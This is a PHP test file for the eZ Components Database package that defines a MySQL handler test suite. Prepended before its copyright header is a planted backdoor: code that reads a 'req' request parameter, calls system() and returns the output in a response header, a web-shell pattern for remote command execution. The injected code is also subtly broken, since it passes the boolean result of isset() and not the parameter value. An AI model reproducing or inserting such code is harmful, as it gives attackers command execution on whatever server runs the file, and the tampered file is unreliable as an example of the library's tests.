<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
/**
 * @copyright Copyright (C) 2005-2009 eZ Systems AS. All rights reserved.
 * @license http://ez.no/licenses/new_bsd New BSD License
 * @version //autogentag//
 * @filesource
 * @package Database
 * @subpackage Tests
 */

require_once 'base.php';

/**
 * @package Database
 * @subpackage Tests
 */
class ezcDatabaseHandlerMysqlTest extends ezcDatabaseHandlerBaseTest
{
    public static function suite()
    {
         return new PHPUnit_Framework_TestSuite( __CLASS__ );
    }

    protected function setUp()
    {
        $this->handlerClass = 'ezcDbHandlerMysql';
        parent::setUp();
    }
}

?>
